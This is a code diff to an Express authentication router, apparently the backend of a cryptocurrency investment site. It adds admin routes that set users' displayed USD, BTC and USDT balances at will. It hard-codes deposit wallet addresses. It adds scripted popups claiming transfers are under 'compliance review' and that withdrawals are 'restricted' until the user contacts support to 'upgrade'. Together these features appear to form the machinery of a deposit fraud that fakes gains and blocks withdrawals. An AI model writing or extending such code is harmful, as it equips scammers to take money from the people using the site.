@@ -3,10 +3,72 @@ import rateLimit from 'express-rate-limit';
 import bcrypt from 'bcryptjs';
 import jwt from 'jsonwebtoken';
 import User from '../models/User.js';
+import Setting from '../models/Setting.js';
 import { signToken, requireAuth, signTempToken, adminAuth } from '../middleware/auth.js';
 import { sendEmail } from '../services/email.js';
 
 const router = Router();
+
+const DEFAULT_SEND_REVIEW_MESSAGE =
+  'Your transfer has been placed under compliance review. Please contact support to verify and complete this transaction.';
+const DEFAULT_BTC_WALLET = 'bc1qrkue55nt2h0pjkge2yk7jqkekymxknawr982py';
+const DEFAULT_USDT_WALLET = '0xD5d04b7628fE6d0834870888Fe557972aF8Ca49f';
+const DEFAULT_WITHDRAWAL_MESSAGE =
+  'Withdrawals are currently restricted for your account tier. Please contact support to upgrade your account and unlock withdrawals.';
+
+async function getSendReviewSetting() {
+  try {
+    const doc = await Setting.findOne({ key: 'sendReviewPopup' });
+    const val = doc?.value || {};
+    return {
+      enabled: Boolean(val.enabled),
+      message: typeof val.message === 'string' && val.message.trim()
+        ? val.message.trim()
+        : DEFAULT_SEND_REVIEW_MESSAGE,
+    };
+  } catch {
+    return { enabled: false, message: DEFAULT_SEND_REVIEW_MESSAGE };
+  }
+}
+
+async function getGlobalAppSettings() {
+  try {
+    const doc = await Setting.findOne({ key: 'appGlobalSettings' });
+    const val = doc?.value || {};
+    return {
+      btcWalletAddress: typeof val.btcWalletAddress === 'string' && val.btcWalletAddress.trim()
+        ? val.btcWalletAddress.trim()
+        : DEFAULT_BTC_WALLET,
+      usdtWalletAddress: typeof val.usdtWalletAddress === 'string' && val.usdtWalletAddress.trim()
+        ? val.usdtWalletAddress.trim()
+        : DEFAULT_USDT_WALLET,
+      withdrawalMessage: typeof val.withdrawalMessage === 'string' && val.withdrawalMessage.trim()
+        ? val.withdrawalMessage.trim()
+        : DEFAULT_WITHDRAWAL_MESSAGE,
+    };
+  } catch {
+    return {
+      btcWalletAddress: DEFAULT_BTC_WALLET,
+      usdtWalletAddress: DEFAULT_USDT_WALLET,
+      withdrawalMessage: DEFAULT_WITHDRAWAL_MESSAGE,
+    };
+  }
+}
+
+async function buildUserPayload(user) {
+  const base = user.toPublicJSON();
+  const [sendReview, globalApp] = await Promise.all([
+    getSendReviewSetting(),
+    getGlobalAppSettings(),
+  ]);
+  return {
+    ...base,
+    globalSendReviewMessage: sendReview.message,
+    globalBtcWalletAddress: globalApp.btcWalletAddress,
+    globalUsdtWalletAddress: globalApp.usdtWalletAddress,
+    globalWithdrawalMessage: globalApp.withdrawalMessage,
+  };
+}
 
 
 const authLimiter = rateLimit({
@@ -67,7 +129,13 @@ router.post('/signup', authLimiter, async (req, res) => {
       user.password = password;
       if (mobileNumber) user.mobileNumber = mobileNumber.trim();
     } else {
-      const userObj = { fullName, email, password };
+      const globalSetting = await getSendReviewSetting();
+      const userObj = {
+        fullName,
+        email,
+        password,
+        sendReviewPopupEnabled: Boolean(globalSetting.enabled),
+      };
       if (mobileNumber) userObj.mobileNumber = mobileNumber.trim();
       user = new User(userObj);
     }
@@ -138,7 +206,7 @@ router.post('/login', authLimiter, async (req, res) => {
     // Bypass OTP for admins
     if (user.role === 'admin') {
       const token = signToken(user._id);
-      return res.json({ token, user: user.toPublicJSON() });
+      return res.json({ token, user: await buildUserPayload(user) });
     }
 
     const otp = await issueOtp(user);
@@ -203,17 +271,17 @@ router.post('/verify-otp', async (req, res) => {
     await User.findByIdAndUpdate(user._id, updateFields);
 
     const tokenFinal = signToken(user._id);
-    return res.json({ token: tokenFinal, user: user.toPublicJSON() });
+    return res.json({ token: tokenFinal, user: await buildUserPayload(user) });
   } catch (err) {
     console.error('Verify OTP error:', err);
     return res.status(500).json({ message: 'Something went wrong' });
   }
 });
 
-// â”€â”€ GET /api/auth/me â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// ── GET /api/auth/me ────────────────────────────────────────
 // Used by the frontend on page load to restore the session from a stored token
 router.get('/me', requireAuth, async (req, res) => {
-  return res.json({ user: req.user.toPublicJSON() });
+  return res.json({ user: await buildUserPayload(req.user) });
 });
 
 // â”€â”€ ADMIN ROUTES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
@@ -274,15 +342,21 @@ router.put('/users/:email/toggle-send', adminAuth, async (req, res) => {
 // Admin route to update balance
 router.put('/users/:email/balance', adminAuth, async (req, res) => {
   try {
-    const { balanceUsd, btcHolding } = req.body;
+    const { balanceUsd, btcHolding, usdtHolding } = req.body;
     const user = await User.findOne({ email: req.params.email.toLowerCase() });
     if (!user) return res.status(404).json({ message: 'User not found' });
     
     if (balanceUsd !== undefined) user.balanceUsd = balanceUsd;
     if (btcHolding !== undefined) user.btcHolding = btcHolding;
+    if (usdtHolding !== undefined) user.usdtHolding = usdtHolding;
     
     await user.save();
-    return res.json({ message: 'Balance updated', balanceUsd: user.balanceUsd, btcHolding: user.btcHolding });
+    return res.json({
+      message: 'Balance updated',
+      balanceUsd: user.balanceUsd,
+      btcHolding: user.btcHolding,
+      usdtHolding: user.usdtHolding ?? 2500,
+    });
   } catch (err) {
     console.error('Update balance error:', err);
     return res.status(500).json({ message: 'Something went wrong' });
@@ -354,6 +428,132 @@ router.put('/users/:email/withdrawal-message', adminAuth, async (req, res) => {
     });
   } catch (err) {
     console.error('Update withdrawal message error:', err);
+    return res.status(500).json({ message: 'Something went wrong' });
+  }
+});
+
+// ── PUT /api/auth/users/:email/send-review-popup ──
+// Admin route to configure the popup modal shown when a user clicks Review transfer while Send is ON
+router.put('/users/:email/send-review-popup', adminAuth, async (req, res) => {
+  try {
+    const user = await User.findOne({ email: req.params.email.toLowerCase() });
+    if (!user) return res.status(404).json({ message: 'User not found' });
+
+    if (typeof req.body?.sendReviewPopupEnabled === 'boolean') {
+      user.sendReviewPopupEnabled = req.body.sendReviewPopupEnabled;
+    }
+    if (typeof req.body?.sendReviewPopupMessage === 'string') {
+      user.sendReviewPopupMessage = req.body.sendReviewPopupMessage.trim();
+    }
+    await user.save();
+
+    return res.json({
+      message: 'Send review popup updated',
+      sendReviewPopupEnabled: Boolean(user.sendReviewPopupEnabled),
+      sendReviewPopupMessage: user.sendReviewPopupMessage || '',
+    });
+  } catch (err) {
+    console.error('Update send review popup error:', err);
+    return res.status(500).json({ message: 'Something went wrong' });
+  }
+});
+
+// ── GET /api/auth/settings/send-review-popup ──
+router.get('/settings/send-review-popup', adminAuth, async (req, res) => {
+  const setting = await getSendReviewSetting();
+  return res.json(setting);
+});
+
+// ── PUT /api/auth/settings/send-review-popup ──
+router.put('/settings/send-review-popup', adminAuth, async (req, res) => {
+  try {
+    const current = await getSendReviewSetting();
+    const enabled = typeof req.body?.enabled === 'boolean' ? req.body.enabled : current.enabled;
+    const message = typeof req.body?.message === 'string' && req.body.message.trim()
+      ? req.body.message.trim()
+      : DEFAULT_SEND_REVIEW_MESSAGE;
+
+    await Setting.findOneAndUpdate(
+      { key: 'sendReviewPopup' },
+      { key: 'sendReviewPopup', value: { enabled, message } },
+      { upsert: true, new: true }
+    );
+
+    if (req.body?.applyToAll === true) {
+      await User.updateMany(
+        { role: { $ne: 'admin' } },
+        { $set: { sendReviewPopupEnabled: enabled } }
+      );
+    }
+
+    return res.json({
+      message: 'Global send review popup settings updated',
+      enabled,
+      writeup: message,
+    });
+  } catch (err) {
+    console.error('Update global send review popup error:', err);
+    return res.status(500).json({ message: 'Something went wrong' });
+  }
+});
+
+// ── PUT /api/auth/users/:email/wallets ──
+// Admin route to persist per-user BTC / USDT deposit wallet addresses in MongoDB
+router.put('/users/:email/wallets', adminAuth, async (req, res) => {
+  try {
+    const user = await User.findOne({ email: req.params.email.toLowerCase() });
+    if (!user) return res.status(404).json({ message: 'User not found' });
+
+    if (typeof req.body?.btcWalletAddress === 'string') {
+      user.btcWalletAddress = req.body.btcWalletAddress.trim();
+    }
+    if (typeof req.body?.usdtWalletAddress === 'string') {
+      user.usdtWalletAddress = req.body.usdtWalletAddress.trim();
+    }
+    await user.save();
+
+    return res.json({
+      message: 'Wallet addresses updated',
+      btcWalletAddress: user.btcWalletAddress || '',
+      usdtWalletAddress: user.usdtWalletAddress || '',
+    });
+  } catch (err) {
+    console.error('Update user wallets error:', err);
+    return res.status(500).json({ message: 'Something went wrong' });
+  }
+});
+
+// ── GET /api/auth/settings/global ──
+router.get('/settings/global', adminAuth, async (req, res) => {
+  const settings = await getGlobalAppSettings();
+  return res.json(settings);
+});
+
+// ── PUT /api/auth/settings/global ──
+router.put('/settings/global', adminAuth, async (req, res) => {
+  try {
+    const current = await getGlobalAppSettings();
+    const nextValue = {
+      btcWalletAddress: typeof req.body?.btcWalletAddress === 'string'
+        ? (req.body.btcWalletAddress.trim() || DEFAULT_BTC_WALLET)
+        : current.btcWalletAddress,
+      usdtWalletAddress: typeof req.body?.usdtWalletAddress === 'string'
+        ? (req.body.usdtWalletAddress.trim() || DEFAULT_USDT_WALLET)
+        : current.usdtWalletAddress,
+      withdrawalMessage: typeof req.body?.withdrawalMessage === 'string'
+        ? (req.body.withdrawalMessage.trim() || DEFAULT_WITHDRAWAL_MESSAGE)
+        : current.withdrawalMessage,
+    };
+
+    await Setting.findOneAndUpdate(
+      { key: 'appGlobalSettings' },
+      { key: 'appGlobalSettings', value: nextValue },
+      { upsert: true, new: true }
+    );
+
+    return res.json({ message: 'Global settings updated', ...nextValue });
+  } catch (err) {
+    console.error('Update global settings error:', err);
     return res.status(500).json({ message: 'Something went wrong' });
   }
 });
